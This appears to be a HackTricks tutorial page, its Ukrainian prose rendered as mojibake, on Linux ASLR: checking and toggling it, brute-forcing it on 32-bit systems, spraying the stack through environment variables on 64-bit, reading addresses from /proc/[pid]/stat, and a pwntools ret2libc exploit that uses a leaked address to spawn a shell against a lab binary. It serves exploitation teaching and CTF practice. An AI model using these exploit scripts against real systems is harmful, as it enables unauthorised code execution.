# ASLR

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

**–í–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –ø—Ä–æ—Å—Ç–æ—Ä—É –∞–¥—Ä–µ—Å (ASLR)** - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞ –±–µ–∑–ø–µ–∫–∏, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö –¥–ª—è **–≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –∞–¥—Ä–µ—Å –ø–∞–º'—è—Ç—ñ**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Å–∏—Å—Ç–µ–º–Ω–∏–º–∏ —Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–Ω–∏–º–∏ –ø—Ä–æ—Ü–µ—Å–∞–º–∏. –¶–µ –∑–Ω–∞—á–Ω–æ —É—Å–∫–ª–∞–¥–Ω—é—î –ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–Ω—è –º—ñ—Å—Ü—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤ —Ç–∞ –¥–∞–Ω–∏—Ö, —Ç–∞–∫–∏—Ö —è–∫ —Å—Ç–µ–∫, –∫—É–ø–∞ —Ç–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Ç–∏–º —Å–∞–º–∏–º –∑–∞–ø–æ–±—ñ–≥–∞—é—á–∏ –ø–µ–≤–Ω–∏–º —Ç–∏–ø–∞–º –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤, –∑–æ–∫—Ä–µ–º–∞ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è–º –±—É—Ñ–µ—Ä–∞.

### **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å—É ASLR**

–©–æ–± **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏** —Å—Ç–∞—Ç—É—Å ASLR –≤ —Å–∏—Å—Ç–µ–º—ñ Linux, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∑ —Ñ–∞–π–ª—É **`/proc/sys/kernel/randomize_va_space`**. –ó–Ω–∞—á–µ–Ω–Ω—è, –∑–±–µ—Ä–µ–∂–µ–Ω–µ –≤ —Ü—å–æ–º—É —Ñ–∞–π–ª—ñ, –≤–∏–∑–Ω–∞—á–∞—î —Ç–∏–ø –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ–≥–æ ASLR:

* **0**: –í—ñ–¥—Å—É—Ç–Ω—î –≤–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è. –í—Å–µ —Å—Ç–∞—Ç–∏—á–Ω–µ.
* **1**: –ö–æ–Ω—Å–µ—Ä–≤–∞—Ç–∏–≤–Ω–µ –≤–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è. –†–∞–Ω–¥–æ–º—ñ–∑—É—é—Ç—å—Å—è —Å–ø—ñ–ª—å–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Å—Ç–µ–∫, mmap(), —Å—Ç–æ—Ä—ñ–Ω–∫–∞ VDSO.
* **2**: –ü–æ–≤–Ω–µ –≤–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è. –ö—Ä—ñ–º –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, —è–∫—ñ —Ä–∞–Ω–¥–æ–º—ñ–∑—É—é—Ç—å—Å—è –∫–æ–Ω—Å–µ—Ä–≤–∞—Ç–∏–≤–Ω–∏–º –≤–∞—Ä—ñ–∞–Ω—Ç–æ–º, –ø–∞–º'—è—Ç—å, –∫–µ—Ä–æ–≤–∞–Ω–∞ —á–µ—Ä–µ–∑ `brk()`, —Ä–∞–Ω–¥–æ–º—ñ–∑—É—î—Ç—å—Å—è.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å—Ç–∞—Ç—É—Å ASLR –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **–í–∏–º–∫–Ω–µ–Ω–Ω—è ASLR**

–î–ª—è **–≤–∏–º–∫–Ω–µ–Ω–Ω—è** ASLR –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –∑–Ω–∞—á–µ–Ω–Ω—è `/proc/sys/kernel/randomize_va_space` –Ω–∞ **0**. –ó–∞–∑–≤–∏—á–∞–π –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–º–∏–∫–∞—Ç–∏ ASLR, –∫—Ä—ñ–º –≤–∏–ø–∞–¥–∫—ñ–≤ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –∞–±–æ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è. –û—Å—å —è–∫ —Ü–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–º–∫–Ω—É—Ç–∏ ASLR –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **–£–≤—ñ–º–∫–Ω–µ–Ω–Ω—è ASLR**

–î–ª—è **—É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è** ASLR –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Å–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è **2** —É —Ñ–∞–π–ª `/proc/sys/kernel/randomize_va_space`. –ó–∞–∑–≤–∏—á–∞–π –¥–ª—è —Ü—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó root. –ü–æ–≤–Ω–µ –≤–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –º–æ–∂–Ω–∞ –≤–≤—ñ–º–∫–Ω—É—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **–°—Ç—ñ–π–∫—ñ—Å—Ç—å –ø—ñ—Å–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**

–ó–º—ñ–Ω–∏, –≤–Ω–µ—Å–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥ `echo`, —î —Ç–∏–º—á–∞—Å–æ–≤–∏–º–∏ —ñ –±—É–¥—É—Ç—å —Å–∫–∏–Ω—É—Ç—ñ –ø—Ä–∏ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ. –©–æ–± –∑—Ä–æ–±–∏—Ç–∏ –∑–º—ñ–Ω—É —Å—Ç—ñ–π–∫–æ—é, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ —Ñ–∞–π–ª `/etc/sysctl.conf` —Ç–∞ –¥–æ–¥–∞—Ç–∏ –∞–±–æ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—è–¥–æ–∫:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
–ü—ñ—Å–ª—è —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è `/etc/sysctl.conf` –∑–∞—Å—Ç–æ—Å—É–π—Ç–µ –∑–º—ñ–Ω–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
sudo sysctl -p
```
–¶–µ –∑–∞–±–µ–∑–ø–µ—á–∏—Ç—å, —â–æ –≤–∞—à—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è ASLR –∑–∞–ª–∏—à–∞—Ç—å—Å—è –ø—ñ—Å–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

## **–û–±—Ö—ñ–¥**

### 32-–±—ñ—Ç–Ω–µ –≥—Ä—É–±–µ –Ω–∞—Å–∏–ª—å—Å—Ç–≤–æ

PaX —Ä–æ–∑–¥—ñ–ª—è—î –ø—Ä–æ—Å—Ç—ñ—Ä –∞–¥—Ä–µ—Å –ø—Ä–æ—Ü–µ—Å—É –Ω–∞ **3 –≥—Ä—É–ø–∏**:

* **–ö–æ–¥ —Ç–∞ –¥–∞–Ω—ñ** (—ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ —Ç–∞ –Ω–µ—ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ): `.text`, `.data` —Ç–∞ `.bss` ‚Äî> **16 –±—ñ—Ç** –µ–Ω—Ç—Ä–æ–ø—ñ—ó —É –∑–º—ñ–Ω–Ω—ñ–π `delta_exec`. –¶—è –∑–º—ñ–Ω–Ω–∞ –≤–∏–ø–∞–¥–∫–æ–≤–æ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è –∑ –∫–æ–∂–Ω–∏–º –ø—Ä–æ—Ü–µ—Å–æ–º —Ç–∞ –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ –ø–æ—á–∞—Ç–∫–æ–≤–∏—Ö –∞–¥—Ä–µ—Å.
* **–ü–∞–º'—è—Ç—å**, –≤–∏–¥—ñ–ª–µ–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `mmap()` —Ç–∞ **—Å–ø—ñ–ª—å–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏** ‚Äî> **16 –±—ñ—Ç**, –ø–æ–∑–Ω–∞—á–µ–Ω–∞ —è–∫ `delta_mmap`.
* **–°—Ç–µ–∫** ‚Äî> **24 –±—ñ—Ç–∏**, –ø–æ–∑–Ω–∞—á–µ–Ω–∞ —è–∫ `delta_stack`. –û–¥–Ω–∞–∫ —Ñ–∞–∫—Ç–∏—á–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **11 –±—ñ—Ç** (–≤—ñ–¥ 10-–≥–æ –¥–æ 20-–≥–æ –±–∞–π—Ç–∞ –≤–∫–ª—é—á–Ω–æ), –≤–∏—Ä—ñ–≤–Ω—è–Ω—ñ –Ω–∞ **16 –±–∞–π—Ç** ‚Äî> –¶–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ **524,288 –º–æ–∂–ª–∏–≤–∏—Ö —Ä–µ–∞–ª—å–Ω–∏—Ö –∞–¥—Ä–µ—Å —Å—Ç–µ–∫—É**.

–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ –¥–∞–Ω—ñ –¥–ª—è 32-–±—ñ—Ç–Ω–∏—Ö —Å–∏—Å—Ç–µ–º, –∞ –∑–º–µ–Ω—à–µ–Ω–∞ –∫—ñ–Ω—Ü–µ–≤–∞ –µ–Ω—Ç—Ä–æ–ø—ñ—è –¥–æ–∑–≤–æ–ª—è—î –æ–±—ñ–π—Ç–∏ ASLR, —Å–ø—Ä–æ–±—É–≤–∞–≤—à–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–Ω–æ–≤—É —ñ –∑–Ω–æ–≤—É, –ø–æ–∫–∏ –µ–∫—Å–ø–ª–æ–π—Ç —É—Å–ø—ñ—à–Ω–æ –∑–∞–≤–µ—Ä—à–∏—Ç—å—Å—è.

#### –Ü–¥–µ—ó –¥–ª—è –≥—Ä—É–±–æ–≥–æ –Ω–∞—Å–∏–ª—å—Å—Ç–≤–∞:

* –Ø–∫—â–æ —É –≤–∞—Å –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –≤–µ–ª–∏–∫–µ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –¥–ª—è —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è **–≤–µ–ª–∏–∫–æ–≥–æ NOP-–∫–æ–≤–∑–∞–Ω–Ω—è –ø–µ—Ä–µ–¥ –∫–æ–¥–æ–º –æ–±–æ–ª–æ–Ω–∫–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –≥—Ä—É–±–æ –Ω–∞—Å–∏–ª—å–Ω–æ –ø–µ—Ä–µ–±–∏—Ä–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏ –≤ —Å—Ç–µ–∫—É, –ø–æ–∫–∏ –ø–æ—Ç—ñ–∫ **–ø–µ—Ä–µ—Å–∫–æ—á–∏—Ç—å –¥–µ—è–∫—É —á–∞—Å—Ç–∏–Ω—É NOP-–∫–æ–¥—É**.
* –©–µ –æ–¥–∏–Ω –≤–∞—Ä—ñ–∞–Ω—Ç –¥–ª—è —Ü—å–æ–≥–æ —É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –Ω–µ –Ω–∞—Å—Ç—ñ–ª—å–∫–∏ –≤–µ–ª–∏–∫–µ —ñ –µ–∫—Å–ø–ª–æ–π—Ç –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–ø—É—â–µ–Ω–∏–π –ª–æ–∫–∞–ª—å–Ω–æ, —Ü–µ –º–æ–∂–ª–∏–≤–æ **–¥–æ–¥–∞—Ç–∏ NOP-–∫–æ–¥ —Ç–∞ –∫–æ–¥ –æ–±–æ–ª–æ–Ω–∫–∏ –≤ –∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞**.
* –Ø–∫—â–æ –µ–∫—Å–ø–ª–æ–π—Ç –ª–æ–∫–∞–ª—å–Ω–∏–π, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≥—Ä—É–±–æ –Ω–∞—Å–∏–ª—å–Ω–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É libc (–∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è 32-–±—ñ—Ç–Ω–∏—Ö —Å–∏—Å—Ç–µ–º):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* –Ø–∫—â–æ –≤–∏ –∞—Ç–∞–∫—É—î—Ç–µ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π —Å–µ—Ä–≤–µ—Ä, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø–µ—Ä–µ–±—Ä–∞—Ç–∏ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó `usleep` —É `libc`**, –ø–µ—Ä–µ–¥–∞—é—á–∏ —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç 10 (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥). –Ø–∫—â–æ –≤ —è–∫–∏–π—Å—å –º–æ–º–µ–Ω—Ç **—Å–µ—Ä–≤–µ—Ä –≤–∏—Ç—Ä–∞—á–∞—î –¥–æ–¥–∞—Ç–∫–æ–≤—ñ 10 —Å–µ–∫—É–Ω–¥ –Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å**, –≤–∏ –∑–Ω–∞–π—à–ª–∏ –∞–¥—Ä–µ—Å—É —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó.

{% hint style="success" %}
–ù–∞ 64-–±—ñ—Ç–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö –µ–Ω—Ç—Ä–æ–ø—ñ—è –Ω–∞–±–∞–≥–∞—Ç–æ –≤–∏—â–∞, —ñ —Ü–µ –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º.
{% endhint %}

### –ü–µ—Ä–µ–±–æ—Ä —Å—Ç–µ–∫—É 64 –±—ñ—Ç–∏

–ú–æ–∂–ª–∏–≤–æ –∑–∞–π–Ω—è—Ç–∏ –≤–µ–ª–∏–∫—É —á–∞—Å—Ç–∏–Ω—É —Å—Ç–µ–∫—É –∑–º—ñ–Ω–Ω–∏–º–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, –∞ –ø–æ—Ç—ñ–º —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–º —Ñ–∞–π–ª–æ–º —Å–æ—Ç–Ω—ñ/—Ç–∏—Å—è—á—ñ —Ä–∞–∑—ñ–≤ –ª–æ–∫–∞–ª—å–Ω–æ, —â–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ.\
–ù–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥ –ø–æ–∫–∞–∑—É—î, —è–∫ –º–æ–∂–Ω–∞ **–ø—Ä–æ—Å—Ç–æ –≤–∏–±—Ä–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –≤ —Å—Ç–µ—Ü—ñ** —ñ –∫–æ–∂–Ω—ñ **–∫—ñ–ª—å–∫–∞ —Å–æ—Ç–µ–Ω—å –≤–∏–∫–æ–Ω–∞–Ω—å** —Ü—è –∞–¥—Ä–µ—Å–∞ –±—É–¥–µ –º—ñ—Å—Ç–∏—Ç–∏ **—ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—é NOP**:
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>

### –õ–æ–∫–∞–ª—å–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è (`/proc/[pid]/stat`)

–§–∞–π–ª **`/proc/[pid]/stat`** –ø—Ä–æ—Ü–µ—Å—É –∑–∞–≤–∂–¥–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –∫–æ–∂–Ω–æ–º—É —ñ –≤—ñ–Ω **–º—ñ—Å—Ç–∏—Ç—å —Ü—ñ–∫–∞–≤—É** —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫:

* **startcode** & **endcode**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ –∑ **TEXT** –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É
* **startstack**: –ê–¥—Ä–µ—Å–∞ –ø–æ—á–∞—Ç–∫—É **—Å—Ç–µ–∫—É**
* **start\_data** & **end\_data**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è **BSS**
* **kstkesp** & **kstkeip**: –ü–æ—Ç–æ—á–Ω—ñ –∞–¥—Ä–µ—Å–∏ **ESP** —Ç–∞ **EIP**
* **arg\_start** & **arg\_end**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è **–∞—Ä–≥—É–º–µ–Ω—Ç–∏ –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞**
* **env\_start** & **env\_end**: –ê–¥—Ä–µ—Å–∏ –≤–∏—â–µ —ñ –Ω–∏–∂—á–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è **–∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞**

–û—Ç–∂–µ, —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ —Ç–æ–º—É –∂ –∫–æ–º–ø'—é—Ç–µ—Ä—ñ, —â–æ —ñ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è, —ñ —Ü–µ–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –æ—á—ñ–∫—É—î –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –≤—ñ–¥ —Å–∏—Ä–æ—ó –∞—Ä–≥—É–º–µ–Ω—Ç–∞—Ü—ñ—ó, –∞–ª–µ –≤—ñ–¥ —ñ–Ω—à–æ–≥–æ **–≤–≤–æ–¥—É, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –ø—ñ—Å–ª—è —á–∏—Ç–∞–Ω–Ω—è —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É**. –î–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –º–æ–∂–ª–∏–≤–æ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—è–∫—ñ –∞–¥—Ä–µ—Å–∏ –∑ —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É —Ç–∞ –ø–æ–±—É–¥—É–≤–∞—Ç–∏ –∑ –Ω–∏—Ö –∑–º—ñ—â–µ–Ω–Ω—è –¥–ª—è –µ–∫—Å–ø–ª–æ–π—Ç—É**.

{% hint style="success" %}
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü–µ–π —Ñ–∞–π–ª –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html), —à—É–∫–∞—é—á–∏ `/proc/pid/stat`
{% endhint %}

### –ú–∞—é—á–∏ –≤–∏—Ç—ñ–∫

* **–ó–∞–≤–¥–∞–Ω–Ω—è –ø–æ–ª—è–≥–∞—î –≤ –Ω–∞–¥–∞–Ω–Ω—ñ –≤–∏—Ç–æ–∫—É**

–Ø–∫—â–æ –≤–∞–º –Ω–∞–¥–∞–Ω–æ –≤–∏—Ç—ñ–∫ (–ª–µ–≥–∫—ñ –∑–∞–≤–¥–∞–Ω–Ω—è CTF), –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ –∑–º—ñ—â–µ–Ω–Ω—è –∑ –Ω—å–æ–≥–æ (–ø—Ä–∏–ø—É—Å–∫–∞—é—á–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ —Ç–æ—á–Ω—É –≤–µ—Ä—Å—ñ—é libc, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ —Å–∏—Å—Ç–µ–º—ñ, —è–∫—É –≤–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—î—Ç–µ). –¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –µ–∫—Å–ø–ª–æ–π—Ç—É –≤–∑—è—Ç–æ –∑ [**–ø—Ä–∏–∫–ª–∞–¥—É –∑–≤—ñ–¥—Å–∏**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –¥–µ—Ç–∞–ª–µ–π):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è–º –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è–º –±—É—Ñ–µ—Ä–∞ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ **ret2plt** –¥–ª—è –≤–∏—Ç—ñ—Å–Ω–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ libc. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

